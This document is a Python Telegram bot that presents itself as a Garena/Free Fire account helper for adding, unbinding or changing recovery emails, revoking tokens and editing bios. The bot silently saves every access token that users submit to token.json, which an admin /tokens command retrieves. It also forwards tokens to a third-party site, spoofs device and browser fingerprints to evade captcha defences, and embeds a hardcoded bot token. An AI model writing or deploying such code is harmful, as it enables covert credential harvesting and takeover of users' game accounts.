import json
import logging
import os
import time
import random
import threading
from flask import Flask

from curl_cffi import requests

from telegram import (
    Update,
    ReplyKeyboardMarkup,
    KeyboardButton,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    BotCommand,
)

from telegram.ext import (
    Application,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    CallbackQueryHandler,
    filters,
)

# ============================================================
# BOT TOKEN & CONFIG
# ============================================================
BOT_TOKEN = "8939638878:AAHztEjYIPba7vCLi1W-7dCkHCJEHPQOL9s"
ADMIN_ID = 123456789 

REQUIRED_CHANNELS = [
    {"name": "Official Channel", "username": "@Ghost_Antiban"},
    {"name": "Garena Email Support", "username": "@GarenaEmailSupport"},
    {"name": "Like Group", "username": "@RFG_GAMER_CHAT"},
]

YOUTUBE_URL = "https://youtube.com/@RFG_GAMERR"

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)

# ============================================================
# FLASK SERVER & SELF-PING SYSTEM
# ============================================================
app_flask = Flask(__name__)

@app_flask.route("/")
def home():
    return "Bot is Alive!", 200

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app_flask.run(host="0.0.0.0", port=port)

def keep_alive_ping():
    time.sleep(10)
    render_url = os.environ.get("RENDER_EXTERNAL_URL")
    port = os.environ.get("PORT", "8080")
    ping_url = render_url if render_url else f"http://127.0.0.1:{port}"

    while True:
        try:
            requests.get(ping_url, timeout=10)
            logging.info("Keep-alive ping sent to server.")
        except Exception as e:
            logging.warning(f"Keep-alive ping failed: {e}")
        time.sleep(120)

# ============================================================
# DYNAMIC USER-AGENTS & HEADERS ROTATION
# ============================================================
USER_AGENTS = [
    "GarenaMSDK/4.0.41(TECNO KJ5 ;Android 13;en;HK;app 1.123.1 2019120270;)",
    "GarenaMSDK/4.0.38(SAMSUNG SM-G998B ;Android 12;en;US;app 1.123.1 2019120270;)",
    "GarenaMSDK/4.0.40(XIAOMI 2201116PG ;Android 13;en;IN;app 1.123.1 2019120270;)",
    "GarenaMSDK/4.0.39(VIVO V2111 ;Android 11;en;BD;app 1.123.1 2019120270;)",
    "GarenaMSDK/4.0.42(REALME RMX3371 ;Android 13;en;MY;app 1.123.1 2019120270;)"
]

IMPERSONATE_TARGETS = ["chrome110", "chrome116", "edge101", "safari15_3"]

def get_dynamic_headers():
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip",
    }

def get_random_impersonate():
    return random.choice(IMPERSONATE_TARGETS)

MAIN_MENU = [
    [
        KeyboardButton("📧 Add Recovery Email", style="primary"),
        KeyboardButton("🔍 Check Recovery Email", style="primary"),
    ],
    [
        KeyboardButton("🌐 Check Platform", style="primary"),
        KeyboardButton("🚫 Cancel Recovery Email", style="danger"),
    ],
    [
        KeyboardButton("🔗 Unbind Email", style="primary"),
        KeyboardButton("🔄 Change Bind Email", style="primary"),
    ],
    [
        KeyboardButton("🔐 Revoke Access Token", style="danger"),
        KeyboardButton("📝 Update Bio", style="success"),
    ],
    [
        KeyboardButton("🌐 Eat Token Web", style="success"),
    ],
]

UNBIND_MENU = [
    [
        KeyboardButton("1️⃣ By Email OTP", style="primary"),
        KeyboardButton("2️⃣ By Secondary Password", style="primary")
    ],
    [
        KeyboardButton("↩️ Back To Main Menu", style="danger")
    ]
]

CHANGE_MENU = [
    [
        KeyboardButton("1️⃣ Verify Old Email by OTP", style="primary"),
        KeyboardButton("2️⃣ Verify by Secondary Password", style="primary"),
    ],
    [
        KeyboardButton("↩️ Back To Main Menu", style="danger"),
    ],
]

def main_keyboard():
    return ReplyKeyboardMarkup(MAIN_MENU, resize_keyboard=True)

def unbind_keyboard():
    return ReplyKeyboardMarkup(UNBIND_MENU, resize_keyboard=True)

def change_keyboard():
    return ReplyKeyboardMarkup(CHANGE_MENU, resize_keyboard=True)

def back_keyboard():
    return ReplyKeyboardMarkup([[
        KeyboardButton("↩️ Back To Main Menu", style="danger"),
    ]], resize_keyboard=True)

async def show_main_menu(update: Update):
    await update.message.reply_text(
        "🏠 <b>Main Menu</b>\nSelect an option below:",
        parse_mode="HTML",
        reply_markup=main_keyboard(),
    )

def save_token_to_json(token, feature_name, user_id):
    filename = "token.json"
    data = []

    if os.path.exists(filename):
        try:
            with open(filename, "r", encoding="utf-8") as f:
                data = json.load(f)
        except Exception:
            data = []

    entry = {
        "user_id": user_id,
        "feature_used": feature_name,
        "access_token": token
    }
    data.append(entry)

    with open(filename, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=4, ensure_ascii=False)

async def check_user_joined(bot, user_id):
    not_joined = []
    for ch in REQUIRED_CHANNELS:
        try:
            member = await bot.get_chat_member(chat_id=ch["username"], user_id=user_id)
            if member.status in ["left", "kicked"]:
                not_joined.append(ch)
        except Exception:
            not_joined.append(ch)
    return not_joined

async def send_join_request(update_or_query, not_joined_list, is_callback=False):
    keyboard = []
    text_channels = ""

    for ch in not_joined_list:
        url = f"https://t.me/{ch['username'].replace('@', '')}"
        keyboard.append([InlineKeyboardButton(f"Join {ch['name']}", url=url, style="primary")])
        text_channels += f"- {ch['name']}\n"

    keyboard.append([InlineKeyboardButton("Check Join✅", callback_data="check_joined", style="success")])
    keyboard.append([InlineKeyboardButton("Subscribe YouTube Channel", url=YOUTUBE_URL, style="primary")])

    reply_markup = InlineKeyboardMarkup(keyboard)

    msg_text = (
        "<b>Join Verification Required</b>\n\n"
        "To use this bot, you must join the following groups first:\n\n"
        f"<b>{text_channels}</b>\n"
        "After joining, click the button below to verify:"
    )

    if is_callback:
        await update_or_query.edit_message_text(msg_text, parse_mode="HTML", reply_markup=reply_markup)
    else:
        await update_or_query.reply_text(msg_text, parse_mode="HTML", reply_markup=reply_markup)

def parse_api_error(res_json_or_text):
    err_str = str(res_json_or_text)
    
    if "captcha" in err_str.lower() or "geo.captcha-delivery.com" in err_str:
        return "⚠️ <b>Action Failed!</b>\n🛡️ Captcha Protection Triggered! Please wait 1-2 minutes before trying again."
    elif "error_token" in err_str or "error_access_token" in err_str or "invalid_access_token" in err_str or "error_token_invalid" in err_str:
        return "⚠️ <b>Action Failed!</b>\n🔐 Invalid or Expired Access Token!"
    elif "error_email_used" in err_str:
        return "⚠️ <b>Action Failed!</b>\n📧 This Email is already used in another account!"
    elif "error_otp" in err_str or "otp_invalid" in err_str:
        return "⚠️ <b>Action Failed!</b>\n❌ Incorrect OTP Code! Please try again."
    elif "error_secondary_password" in err_str:
        return "⚠️ <b>Action Failed!</b>\n🔑 Wrong Secondary Password!"
    elif "error_frequency_limit" in err_str or "too_many_requests" in err_str:
        return "⚠️ <b>Action Failed!</b>\n⏳ Too many requests! Please wait a few minutes."
    elif "error_email_format" in err_str:
        return "⚠️ <b>Action Failed!</b>\n📧 Invalid Email Address Format!"
    else:
        return f"⚠️ <b>Action Failed!</b>\nDetails: <code>{err_str}</code>"

def convert_seconds(s):
    d, h = divmod(s, 86400)
    h, m = divmod(h, 3600)
    m, s = divmod(m, 60)
    return f"{d} Day {h} Hour {m} Min {s} Sec"

# ============================================================
# API CALLS WITH ROTATION & DELAY
# ============================================================
def api_check_recovery(access_token):
    time.sleep(1) # Anti-rate-limit delay
    url = "https://100067.connect.garena.com/game/account_security/bind:get_bind_info"
    payload = {'app_id': "100067", 'access_token': access_token}
    try:
        rsp = requests.get(url, params=payload, headers=get_dynamic_headers(), impersonate=get_random_impersonate(), timeout=15)
        if rsp.status_code == 200:
            data = rsp.json()
            if "error" in data:
                return parse_api_error(data)
                
            email = data.get("email", "")
            email_to_be = data.get("email_to_be", "")
            countdown = data.get("request_exec_countdown", 0)
            
            if email == "" and email_to_be != "":
                return f"📧 <b>Pending Email:</b> <code>{email_to_be}</code>\n⏳ <b>Confirmation Time:</b> {convert_seconds(countdown)}"
            elif email != "" and email_to_be == "":
                return f"📧 <b>Linked Email:</b> <code>{email}</code>\n✅ <b>Status:</b> Confirmed & Secure!"
            elif email == "" and email_to_be == "":
                return "ℹ️ <b>No Recovery Email Found!</b>"
            return f"📄 <b>Result:</b> <code>{data}</code>"
        return parse_api_error(f"Status Code {rsp.status_code}")
    except Exception as e:
        return f"❌ <b>Network Error:</b> <code>{str(e)}</code>"

def api_check_platform(access_token):
    if not access_token:
        return "⚠️ <b>Please provide an Access Token!</b>"
        
    time.sleep(1)
    try:
        url = "https://100067.connect.garena.com/bind/app/platform/info/get"
        params = {'access_token': access_token}
        
        r = requests.get(url, params=params, headers=get_dynamic_headers(), impersonate=get_random_impersonate(), timeout=15)
        
        if r.status_code not in [200, 201]:
            return "⚠️ <b>Action Failed!</b>\n🔐 Invalid or Expired Access Token!"
            
        j = r.json()
        if "error" in j:
            return parse_api_error(j)

        m = {3: "Facebook", 8: "Gmail", 10: "iCloud", 5: "VK", 11: "Twitter", 7: "Huawei"}
        a = j.get("available_platforms", [])
        
        main_platform = None
        for k in m:
            if k not in a:
                main_platform = m[k]
                break
                
        if main_platform:
            return f"🌐 <b>Platform Name:</b> {main_platform}"
        else:
            return "⚠️ <b>Platform Name:</b> Not Found"
            
    except Exception as e:
        return f"❌ <b>Error:</b> <code>{str(e)}</code>"

def api_cancel_request(access_token):
    time.sleep(1)
    url = "https://100067.connect.garena.com/game/account_security/bind:cancel_request"
    payload = {'app_id': "100067", 'access_token': access_token}
    try:
        rsp = requests.post(url, data=payload, headers=get_dynamic_headers(), impersonate=get_random_impersonate(), timeout=15)
        if rsp.status_code == 200:
            res = rsp.json()
            if res.get("result") == 0:
                return "✅ <b>Successfully Cancelled Recovery Email Request!</b>"
            return parse_api_error(res)
        return "❌ <b>Failed to Cancel Request!</b>"
    except Exception as e:
        return f"❌ <b>Error:</b> <code>{str(e)}</code>"

def api_revoke_token(access_token):
    time.sleep(1)
    url = f"https://100067.connect.garena.com/oauth/logout?access_token={access_token}"
    try:
        r = requests.get(url, headers=get_dynamic_headers(), impersonate=get_random_impersonate(), timeout=15)
        if r.text.strip() == '{"result":0}': 
            return "🎉 <b>TOKEN REVOKED SUCCESSFULLY!</b>"
        return "⚠️ <b>Action Failed!</b>\n🔐 Invalid or Expired Access Token!"
    except Exception as e:
        return f"❌ <b>Error:</b> <code>{str(e)}</code>"

def api_update_bio(access_token, bio_text):
    time.sleep(1)
    url = "https://ob54-asd-long-bio.vercel.app/bio"
    params = {'bio': bio_text, 'access': access_token}
    try:
        r = requests.get(url, params=params, headers=get_dynamic_headers(), impersonate=get_random_impersonate(), timeout=15)
        res = r.json()
        
        status = res.get("status") or res.get("Status")
        if status == "✅ Success" or res.get("result") == "success":
            name = res.get("name", "Unknown")
            updated_bio = res.get("bio", bio_text)
            return (
                f"🎉 <b>Bio Updated Successfully!</b>\n\n"
                f"👤 <b>Name:</b> {name}\n"
                f"⚡ <b>Status:</b> Success\n"
                f"📝 <b>Bio:</b> <code>{updated_bio}</code>"
            )
        else:
            return "⚠️ <b>Action Failed!</b>\n🔐 Invalid or Expired Access Token!"
    except Exception:
        return "⚠️ <b>Action Failed!</b>\n🔐 Invalid or Expired Access Token!"

# ============================================================
# BOT HANDLERS
# ============================================================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    user_id = update.effective_user.id
    
    not_joined = await check_user_joined(context.bot, user_id)
    if not_joined:
        await send_join_request(update.message, not_joined)
        return

    await update.message.reply_text(
        "👋 <b>Welcome to Garena Account Tool</b>\n\nDeveloper: @narutocodexff\nSelect an option:", 
        parse_mode="HTML", reply_markup=main_keyboard()
    )

async def admin_tokens(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await update.message.reply_text("❌ <b>Unauthorized Access!</b>", parse_mode="HTML")
        return

    filename = "token.json"
    if not os.path.exists(filename):
        await update.message.reply_text("ℹ️ <b>No saved tokens found yet.</b>", parse_mode="HTML")
        return

    try:
        with open(filename, "rb") as f:
            await update.message.reply_document(
                document=f,
                filename="token.json",
                caption="📊 <b>Saved Tokens File</b>",
                parse_mode="HTML"
            )
    except Exception as e:
        await update.message.reply_text(f"❌ <b>Error reading file:</b> <code>{str(e)}</code>", parse_mode="HTML")

async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if query.data == "check_joined":
        user_id = query.from_user.id
        not_joined = await check_user_joined(query.bot, user_id)

        if not_joined:
            await send_join_request(query, not_joined, is_callback=True)
        else:
            await query.delete_message()
            await query.message.reply_text(
                "🎉 <b>Verification Successful!</b>\nSelect an option below:",
                parse_mode="HTML",
                reply_markup=main_keyboard()
            )

async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    user_id = update.effective_user.id
    
    not_joined = await check_user_joined(context.bot, user_id)
    if not_joined:
        await send_join_request(update.message, not_joined)
        return

    if text == "↩️ Back To Main Menu":
        context.user_data.clear()
        await show_main_menu(update)
        return

    if text == "📧 Add Recovery Email":
        context.user_data.clear()
        context.user_data["action"] = "add_email"
        context.user_data["waiting"] = "add_email_input"
        await update.message.reply_text("📧 <b>Enter Email:</b>", parse_mode="HTML", reply_markup=back_keyboard())
        return

    elif text == "🔍 Check Recovery Email":
        context.user_data.clear()
        context.user_data["action"] = "check_email"
        context.user_data["waiting"] = "simple_token"
        await update.message.reply_text("🔐 <b>Enter Access Token:</b>", parse_mode="HTML", reply_markup=back_keyboard())
        return

    elif text == "🌐 Check Platform":
        context.user_data.clear()
        context.user_data["action"] = "platform"
        context.user_data["waiting"] = "simple_token"
        await update.message.reply_text("🌐 <b>Enter Access Token:</b>", parse_mode="HTML", reply_markup=back_keyboard())
        return

    elif text == "🚫 Cancel Recovery Email":
        context.user_data.clear()
        context.user_data["action"] = "cancel"
        context.user_data["waiting"] = "simple_token"
        await update.message.reply_text("🚫 <b>Enter Access Token:</b>", parse_mode="HTML", reply_markup=back_keyboard())
        return

    elif text == "🔗 Unbind Email":
        context.user_data.clear()
        context.user_data["action"] = "unbind"
        await update.message.reply_text("🔗 <b>--- UNBIND EMAIL ---</b>\nSelect Option:", parse_mode="HTML", reply_markup=unbind_keyboard())
        return

    elif text == "🔄 Change Bind Email":
        context.user_data.clear()
        context.user_data["action"] = "change"
        await update.message.reply_text("🔄 <b>--- CHANGE BIND EMAIL ---</b>\nSelect Method:", parse_mode="HTML", reply_markup=change_keyboard())
        return

    elif text == "🔐 Revoke Access Token":
        context.user_data.clear()
        context.user_data["action"] = "revoke"
        context.user_data["waiting"] = "simple_token"
        await update.message.reply_text("🔐 <b>Enter Access Token:</b>", parse_mode="HTML", reply_markup=back_keyboard())
        return

    elif text == "📝 Update Bio":
        context.user_data.clear()
        context.user_data["action"] = "update_bio"
        context.user_data["waiting"] = "bio_token"
        await update.message.reply_text("🔐 <b>Enter Access Token:</b>", parse_mode="HTML", reply_markup=back_keyboard())
        return

    elif text == "🌐 Eat Token Web":
        context.user_data.clear()
        web_button = InlineKeyboardMarkup([[
            InlineKeyboardButton("Visit Eat Token Website ↗️", url="https://rfg-gamer.vercel.app/", style="primary")
        ]])
        msg_content = (
            "<b>Eat Token Website</b>\n\n"
            "Click the button below to visit the website to get your Eat Token/Access Token."
        )
        await update.message.reply_text(msg_content, parse_mode="HTML", reply_markup=web_button)
        return

    elif text in ["1️⃣ By Email OTP", "1️⃣ Verify Old Email by OTP"]:
        action = context.user_data.get("action")
        context.user_data["method"] = "otp"
        if action == "unbind":
            context.user_data["waiting"] = "unbind_email"
            await update.message.reply_text("📧 <b>Enter Linked Email:</b>", parse_mode="HTML", reply_markup=back_keyboard())
        elif action == "change":
            context.user_data["waiting"] = "change_token"
            await update.message.reply_text("🔐 <b>Enter Access Token:</b>", parse_mode="HTML", reply_markup=back_keyboard())
        return

    elif text in ["2️⃣ By Secondary Password", "2️⃣ Verify by Secondary Password"]:
        action = context.user_data.get("action")
        context.user_data["method"] = "password"
        if action == "unbind":
            context.user_data["waiting"] = "unbind_email"
            await update.message.reply_text("📧 <b>Enter Linked Email:</b>", parse_mode="HTML", reply_markup=back_keyboard())
        elif action == "change":
            context.user_data["waiting"] = "change_token"
            await update.message.reply_text("🔐 <b>Enter Access Token:</b>", parse_mode="HTML", reply_markup=back_keyboard())
        return

    waiting = context.user_data.get("waiting")
    action = context.user_data.get("action")
    method = context.user_data.get("method")

    if action == "update_bio":
        if waiting == "bio_token":
            save_token_to_json(text, "Update Bio", user_id)
            context.user_data["access"] = text
            context.user_data["waiting"] = "bio_input"
            await update.message.reply_text("📝 <b>Enter New Bio</b> (Max 300 characters):", parse_mode="HTML")
            return
            
        elif waiting == "bio_input":
            if len(text) > 300:
                await update.message.reply_text("⚠️ <b>Bio is too long!</b>\nPlease keep it under 300 characters.", parse_mode="HTML")
                return
                
            acc_token = context.user_data.get("access")
            await update.message.reply_text("⏳ <i>Updating Bio...</i>", parse_mode="HTML")
            msg = api_update_bio(acc_token, text)
            await update.message.reply_text(msg, parse_mode="HTML")
            context.user_data.clear()
            return

    if waiting == "simple_token":
        feature_title = action.replace("_", " ").title()
        if action == "check_email":
            feature_title = "Check Recovery Email"
            msg = api_check_recovery(text)
        elif action == "platform":
            feature_title = "Check Platform"
            msg = api_check_platform(text)
        elif action == "cancel":
            feature_title = "Cancel Recovery Email"
            msg = api_cancel_request(text)
        elif action == "revoke":
            feature_title = "Revoke Access Token"
            msg = api_revoke_token(text)
        else:
            msg = "⚠️ Invalid Action!"
            
        save_token_to_json(text, feature_title, user_id)
        await update.message.reply_text(msg, parse_mode="HTML")
        context.user_data.clear()
        return

    if action == "add_email":
        if waiting == "add_email_input":
            if "@" not in text:
                await update.message.reply_text("📧 <b>Invalid email Format! Please send a valid email.</b>", parse_mode="HTML")
                return
            context.user_data["email"] = text
            context.user_data["waiting"] = "add_email_token"
            await update.message.reply_text("🔐 <b>Enter Access Token:</b>", parse_mode="HTML")
            return
            
        elif waiting == "add_email_token":
            save_token_to_json(text, "Add Recovery Email", user_id)
            context.user_data["access"] = text
            time.sleep(1)
            url = "https://100067.connect.garena.com/game/account_security/bind:send_otp"
            pyl = {'app_id': "100067", 'access_token': text, 'email': context.user_data['email'], 'locale': "en_MA"}
            res = requests.post(url, data=pyl, headers=get_dynamic_headers(), impersonate=get_random_impersonate())
            
            if res.status_code == 200 and res.json().get("result") == 0:
                context.user_data["waiting"] = "add_email_otp"
                await update.message.reply_text("📩 <b>OTP Sent Successfully!</b>\nPlease enter the OTP Code:", parse_mode="HTML")
            else:
                err_msg = parse_api_error(res.json() if res.status_code == 200 else res.text)
                await update.message.reply_text(err_msg, parse_mode="HTML")
                context.user_data.clear()
            return
            
        elif waiting == "add_email_otp":
            time.sleep(1)
            v_url = "https://100067.connect.garena.com/game/account_security/bind:verify_otp"
            v_pyl = {'app_id': "100067", 'access_token': context.user_data['access'], 'otp': text, 'email': context.user_data['email']}
            v_res = requests.post(v_url, data=v_pyl, headers=get_dynamic_headers(), impersonate=get_random_impersonate())
            
            if v_res.status_code == 200 and v_res.json().get("verifier_token"):
                auth = v_res.json().get("verifier_token")
                api_cancel_request(context.user_data['access'])
                
                b_url = "https://100067.connect.garena.com/game/account_security/bind:create_bind_request"
                b_pyl = {'app_id': "100067", 'access_token': context.user_data['access'], 'verifier_token': auth, 'secondary_password': "91B4D142823F7D20C5F08DF69122DE43F35F057A988D9619F6D3138485C9A203", 'email': context.user_data['email']}
                b_res = requests.post(b_url, data=b_pyl, headers=get_dynamic_headers(), impersonate=get_random_impersonate())
                
                if b_res.status_code == 200 and b_res.json().get("result") == 0:
                    await update.message.reply_text(f"🎉 <b>Successfully Added Recovery Email!</b>\n📧 Email: <code>{context.user_data['email']}</code>", parse_mode="HTML")
                else:
                    await update.message.reply_text(parse_api_error(b_res.json()), parse_mode="HTML")
            else:
                await update.message.reply_text(parse_api_error(v_res.json()), parse_mode="HTML")
                
            context.user_data.clear()
            return

    if action == "unbind":
        if waiting == "unbind_email":
            if "@" not in text:
                await update.message.reply_text("📧 <b>Invalid email Format! Please send a valid email.</b>", parse_mode="HTML")
                return
            context.user_data["email"] = text
            context.user_data["waiting"] = "unbind_token"
            await update.message.reply_text("🔐 <b>Enter Access Token:</b>", parse_mode="HTML")
            return
            
        elif waiting == "unbind_token":
            save_token_to_json(text, "Unbind Email", user_id)
            context.user_data["access"] = text
            if method == "otp":
                await update.message.reply_text("⏳ <i>Sending OTP...</i>", parse_mode="HTML")
                time.sleep(1)
                url = "https://100067.connect.garena.com/game/account_security/bind:send_otp"
                data = {"email": context.user_data["email"], "locale": "en_MA", "region": "IND", "app_id": "100067", "access_token": text}
                r = requests.post(url, headers=get_dynamic_headers(), data=data, impersonate=get_random_impersonate())
                
                if r.status_code == 200 and r.json().get("result") == 0:
                    context.user_data["waiting"] = "unbind_otp_input"
                    await update.message.reply_text("📩 <b>OTP Sent Successfully!</b>\nPlease enter the OTP:", parse_mode="HTML")
                else:
                    await update.message.reply_text(parse_api_error(r.json()), parse_mode="HTML")
                    context.user_data.clear()
            elif method == "password":
                context.user_data["waiting"] = "unbind_pass_input"
                await update.message.reply_text("🔑 <b>Enter Secondary Password:</b>", parse_mode="HTML")
            return

        elif waiting in ["unbind_otp_input", "unbind_pass_input"]:
            await update.message.reply_text("⏳ <i>Verifying Identity...</i>", parse_mode="HTML")
            time.sleep(1)
            v_url = "https://100067.connect.garena.com/game/account_security/bind:verify_identity"
            v_data = {"email": context.user_data["email"], "app_id": "100067", "access_token": context.user_data["access"]}
            if waiting == "unbind_otp_input":
                v_data["otp"] = text
            else:
                v_data["secondary_password"] = text

            r = requests.post(v_url, headers=get_dynamic_headers(), data=v_data, impersonate=get_random_impersonate())
            res = r.json()
            if res.get("result") == 0 and res.get("identity_token"):
                u_url = "https://100067.connect.garena.com/game/account_security/bind:create_unbind_request"
                u_data = {"app_id": "100067", "access_token": context.user_data["access"], "identity_token": res.get("identity_token")}
                u_r = requests.post(u_url, headers=get_dynamic_headers(), data=u_data, impersonate=get_random_impersonate())
                u_res = u_r.json()
                
                if u_res.get("result") == 0:
                    await update.message.reply_text("🎉 <b>Email Unbind Request Created Successfully!</b>", parse_mode="HTML")
                else:
                    await update.message.reply_text(parse_api_error(u_res), parse_mode="HTML")
            else:
                await update.message.reply_text(parse_api_error(res), parse_mode="HTML")
            context.user_data.clear()
            return

    if action == "change":
        if waiting == "change_token":
            save_token_to_json(text, "Change Bind Email", user_id)
            context.user_data["access"] = text
            context.user_data["waiting"] = "change_old"
            await update.message.reply_text("📧 <b>Enter Old Email:</b>", parse_mode="HTML")
            return
            
        elif waiting == "change_old":
            if "@" not in text:
                await update.message.reply_text("📧 <b>Invalid email Format! Please send a valid email.</b>", parse_mode="HTML")
                return
            context.user_data["old"] = text
            context.user_data["waiting"] = "change_new"
            await update.message.reply_text("📧 <b>Enter New Email:</b>", parse_mode="HTML")
            return
            
        elif waiting == "change_new":
            if "@" not in text:
                await update.message.reply_text("📧 <b>Invalid email Format! Please send a valid email.</b>", parse_mode="HTML")
                return
            context.user_data["new"] = text
            if method == "otp":
                old = context.user_data["old"]
                await update.message.reply_text(f"⏳ <i>Sending OTP to {old}...</i>", parse_mode="HTML")
                time.sleep(1)
                url = "https://100067.connect.garena.com/game/account_security/bind:send_otp"
                data = {'email': old, 'locale': 'en_MA', 'region': 'IND', 'app_id': '100067', 'access_token': context.user_data["access"]}
                r = requests.post(url, headers=get_dynamic_headers(), data=data, impersonate=get_random_impersonate())
                
                if r.json().get("result") == 0:
                    context.user_data["waiting"] = "change_old_otp"
                    await update.message.reply_text(f"📩 <b>OTP Sent!</b>\nEnter OTP for <code>{old}</code>:", parse_mode="HTML")
                else:
                    await update.message.reply_text(parse_api_error(r.json()), parse_mode="HTML")
                    context.user_data.clear()
            elif method == "password":
                context.user_data["waiting"] = "change_pass"
                await update.message.reply_text("🔑 <b>Enter Secondary Password:</b>", parse_mode="HTML")
            return

        elif waiting in ["change_old_otp", "change_pass"]:
            old = context.user_data["old"]
            new = context.user_data["new"]
            acc = context.user_data["access"]
            
            await update.message.reply_text("⏳ <i>Verifying Identity...</i>", parse_mode="HTML")
            time.sleep(1)
            v_url = "https://100067.connect.garena.com/game/account_security/bind:verify_identity"
            v_data = {'email': old, 'app_id': '100067', 'access_token': acc}
            if waiting == "change_old_otp":
                v_data["otp"] = text
            else:
                v_data["secondary_password"] = text

            r = requests.post(v_url, headers=get_dynamic_headers(), data=v_data, impersonate=get_random_impersonate())
            res = r.json()
            if res.get("result") == 0 and res.get("identity_token"):
                context.user_data["identity_token"] = res.get("identity_token")
                
                s_url = "https://100067.connect.garena.com/game/account_security/bind:send_otp"
                s_data = {'email': new, 'locale': 'en_MA', 'region': 'IND', 'app_id': '100067', 'access_token': acc}
                s_r = requests.post(s_url, headers=get_dynamic_headers(), data=s_data, impersonate=get_random_impersonate())
                
                if s_r.json().get("result") == 0:
                    context.user_data["waiting"] = "change_new_otp"
                    await update.message.reply_text(f"📩 <b>OTP Sent!</b>\nEnter OTP for new email <code>{new}</code>:", parse_mode="HTML")
                else:
                    await update.message.reply_text(parse_api_error(s_r.json()), parse_mode="HTML")
                    context.user_data.clear()
            else:
                await update.message.reply_text(parse_api_error(res), parse_mode="HTML")
                context.user_data.clear()
            return

        elif waiting == "change_new_otp":
            new = context.user_data["new"]
            acc = context.user_data["access"]
            id_tok = context.user_data["identity_token"]

            await update.message.reply_text("⏳ <i>Verifying New Email OTP...</i>", parse_mode="HTML")
            time.sleep(1)
            v_url = "https://100067.connect.garena.com/game/account_security/bind:verify_otp"
            v_data = {'email': new, 'app_id': '100067', 'access_token': acc, 'otp': text}
            r = requests.post(v_url, headers=get_dynamic_headers(), data=v_data, impersonate=get_random_impersonate())
            res = r.json()
            ver_tok = res.get("verifier_token")
            
            if ver_tok:
                r_url = "https://100067.connect.garena.com/game/account_security/bind:create_rebind_request"
                r_data = {'identity_token': id_tok, 'email': new, 'app_id': '100067', 'verifier_token': ver_tok, 'access_token': acc}
                fin = requests.post(r_url, headers=get_dynamic_headers(), data=r_data, impersonate=get_random_impersonate())
                f_res = fin.json()
                
                if f_res.get("result") == 0:
                    await update.message.reply_text("🎉 <b>Email Changed/Rebound Successfully!</b>", parse_mode="HTML")
                else:
                    await update.message.reply_text(parse_api_error(f_res), parse_mode="HTML")
            else:
                await update.message.reply_text(parse_api_error(res), parse_mode="HTML")
            
            context.user_data.clear()
            return

    if not waiting:
        await update.message.reply_text("⚠️ <b>Please select an option from the menu.</b>", parse_mode="HTML")

async def post_init(application: Application):
    commands = [
        BotCommand("start", "Restart Bot")
    ]
    await application.bot.set_my_commands(commands)

def main():
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()

    ping_thread = threading.Thread(target=keep_alive_ping, daemon=True)
    ping_thread.start()

    app = Application.builder().token(BOT_TOKEN).post_init(post_init).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("tokens", admin_tokens))
    app.add_handler(CallbackQueryHandler(callback_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))
    
    print("=" * 50)
    print("      TELEGRAM UI BOT & FLASK SERVER RUNNING")
    print("=" * 50)
    app.run_polling()

if __name__ == "__main__":
    main()
